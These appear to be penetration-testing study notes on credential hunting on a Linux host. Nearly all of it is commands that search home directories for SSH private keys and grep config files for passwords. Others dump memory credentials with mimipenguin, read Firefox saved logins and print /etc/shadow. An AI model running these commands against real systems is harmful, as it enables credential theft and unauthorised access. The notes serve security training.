Check the bash history
```shell-session
>history
```

SSH

private
```shell-session
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
public
```shell-session
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

Searching cronjobs
```shell-session
cat /etc/crontab
```
```shell-session
ls -la /etc/cron.*/
```

Config file search
```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
Search for database files
```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
Searching for abstract notes
```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
Searching for scripts
```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

Logs
![[Pasted image 20240915004009.png]]

Memory/Cache
```shell-session
sudo python3 mimipenguin.py
```
```shell-session
sudo bash mimipenguin.sh
```
https://github.com/huntergregal/mimipenguin
![[Pasted image 20240915004023.png]]

Lazagne Project 
	https://github.com/AlessandroZ/LaZagne

Browser Creds
```shell-session
ls -l .mozilla/firefox/ | grep default
```
```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
Firefox decrypt
	https://github.com/unode/firefox_decrypt
/etc/shadow
```shell-session
 sudo cat /etc/shadow
```
![[Pasted image 20240915122549.png]]
![[Pasted image 20240915122705.png]]